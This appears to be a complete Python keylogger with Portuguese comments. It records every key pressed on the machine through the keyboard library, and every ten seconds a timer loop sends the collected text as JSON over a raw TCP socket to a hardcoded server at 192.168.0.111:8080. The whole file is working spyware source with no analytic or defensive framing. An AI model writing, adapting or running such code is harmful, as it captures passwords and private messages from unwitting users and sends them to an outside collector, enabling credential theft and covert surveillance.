import json
import socket
import threading
import keyboard

# Endereço IP do servidor
ip_address = '192.168.0.111'
# Porta do servidor
port_number = 8080
# Intervalo de tempo para enviar os dados
time_interval = 10
# String para armazenar os dados do teclado
text = ""

def send_post_req():
    try:
        # Convertendo o objeto Python em uma string JSON
        payload = json.dumps({"keyboardData": text})
        
        # Criando um socket TCP/IP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Conectando ao servidor
            s.connect((ip_address, port_number))
            # Enviando a carga útil (payload) ao servidor
            s.sendall(payload.encode())
            #print("Mensagem enviada:", text)
        
        # Configurando um temporizador para executar a função send_post_req novamente após um intervalo de tempo especificado
        timer = threading.Timer(time_interval, send_post_req)
        # Iniciando o temporizador
        timer.start()
    
    except Exception as e:
        print("-> Não foi possível completar a solicitação:", e)

# Função chamada quando uma tecla é pressionada
def on_press(event):
    global text
    key = event.name
    text += key + " "

# Criando o listener do teclado
keyboard.on_press(on_press)

# Iniciando o envio das requisições POST
try:
    print("== Keylogger ativo ==")
    send_post_req()
except KeyboardInterrupt:
    print("-> Interrompido pelo usuário")
    exit()

